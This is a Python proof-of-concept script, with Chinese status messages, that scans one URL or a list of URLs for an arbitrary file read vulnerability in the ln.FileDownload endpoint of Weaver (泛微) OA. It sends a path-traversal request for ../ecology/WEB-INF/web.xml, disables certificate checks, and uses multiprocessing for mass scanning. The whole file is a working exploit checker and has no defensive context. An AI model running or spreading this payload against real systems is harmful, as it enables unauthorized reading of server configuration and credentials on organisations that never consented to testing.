import sys
import requests
import urllib3
import time
import argparse
import multiprocessing
from rich.console import Console
from bs4 import BeautifulSoup 

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
  
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
    console.print(now_time() + " [INFO]     正在检测泛微OA ln.FileDownload 接口存在任意文件读取漏洞", style='bold blue')
    exp_url=target_url+"weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"
    try:
        requests.packages.urllib3.disable_warnings()
        response=requests.get(url=exp_url, headers=headers,verify=False)
        if response.status_code== 200 and 'xml' in response.text:
            console.print(now_time() + ' [SUCCESS]  泛微OA ln.FileDownload 接口存在任意文件读取漏洞:{}'.format(exp_url), style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  泛微OA任意文件读取漏洞不存在', style='bold red ')
    except:
        console.print(now_time() + ' [WARNING]  请求失败，可能无法与目标建立连接或目标不存在', style='bold red')
  
     
if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')

    